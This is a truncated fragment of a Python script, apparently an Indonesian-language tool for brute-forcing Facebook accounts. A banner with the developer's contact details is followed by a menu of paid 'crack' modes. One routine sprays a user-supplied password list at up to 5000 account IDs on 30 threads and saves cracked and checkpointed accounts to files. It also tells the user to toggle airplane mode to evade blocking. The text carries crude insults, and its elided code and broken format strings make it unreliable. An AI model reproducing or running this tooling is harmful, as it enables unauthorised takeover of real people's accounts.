...
class Main:
   ...
   ___  ___  __  ____________________  ___  _________
  / _ )/ _ \/ / / /_  __/ __/ __/ __ \/ _ \/ ___/ __/
 / _  / , _/ /_/ / / / / _// _// /_/ / , _/ /__/ _/  
/____/_/|_|\____/ /_/ /___/_/  \____/_/|_|\___/___/                                                                                            
\033[1;97m••••••••••••••••••••••••••••••••••••••••••••••••••••••••
     \033[1;92m➣ \033[1;92mDEVOLPER   :            ASEP -XC
     \033[1;91m➣ \033[1;92mFACEBOOK   :            ASEP XC 
     \033[1;93m➣ \033[1;92mWHATSAPP   :            083861251898
     \033[1;96m➣ \033[1;92mGITHUB     :            LuthfiXayoranaXD
     \033[1;95m➣ \033[1;92mTOOLS      :            SIMPEL BRUTEFORCE FACEBOOK 
\033[1;97m••••••••••••••••••••••••••••••••••••••••••••••••••••••••
    """)
		print("%s [>] %sNAMA TOOLS: %sBRUTEFORCE"%(G,R,G,Y,G))
		print("%s [>] %sVERSION   : %s1.1"%(G,R,G,Y,G))
		print("%s [>] %sYOUR KEY  : %s%HMZ-****-****-****"%(G,R,G,Y,G,key))
		print("%s [>] %sSTATUS    : %PREMMIUM"%(G,R,G,Y,stat)) 
		print("\n\x1b[1;93m••••••••••••••••••••••••••••••••••••••••••••••••••••••••  ")
		print("\n%s [%s1%s]%s CRACK PUBLIC BIASA %s(FREE)"%(G,R,G,Y,W))
		print("%s [%s2%s]%s CRACK PUBLIC OLD %s(PREMMIUM) V1"%(G,R,G,Y,G))
		print("%s [%s3%s]%s CRACK PUBLIC OLD%s(PREMMIUM) V2"%(G,R,G,Y,G))
		print("%s [%s4%s]%s CRACK PUBLIC FB BIASA %s(PREMMIUM) V3"%(G,R,G,Y,G))
		print("%s [%s5%s]%s CRACK EMAIL %s(PRO SANGAT)"%(G,R,G,Y,G))
		print("%s [%s6%s]%s CRACK RANDOM FB %s(PREMMIUM) V1"%(G,R,G,Y,G))
		print(GET)
		hoga = input("\n%s [?] CHOICE : "%(Y))
		if hoga in ["", " "]:
			Main()
...
#				exit()
	...
	def fbtua(self):
		...
		xx = 999999999
		idx = "100000"
		limit = int(input("\033[0;92m [+] KETIK JUMLAH\033[0;97m(5000 MAX): \033[0;92m"))
		if (limit)>5000:
			exit("\n%s [!] LIMIT HANYA BISA 5000  :)"%(G))
		try:
			...
			with ThreadPoolExecutor(max_workers=30) as coeg:
				...
				listpass = input("%s [?] KETIK PASSWORD :%s "%(Y,G))
				if len(listpass)<=5:
					exit("\n%s [!] PASSWORD MINIMAL 6 KONTOL"%(R))
				print("%s [*] CRACK DIMULAI ANJENG! -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))
				print("\n%s [+] OK RESULT DISIMPEN KE FOLDER -> ok.txt"%(G))
				print("%s [+] CP RESULTS SIMPEN KE FOLDER-> cp.txt"%(Y))
				print("%s [!] MAIN MODE PESAWAT SELAMA 5 DETIK KONTOL\x1b[0m\n"%(R))
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n%s [#] CRACK SELASAI JANGAN LUPA COLI..."%(G))
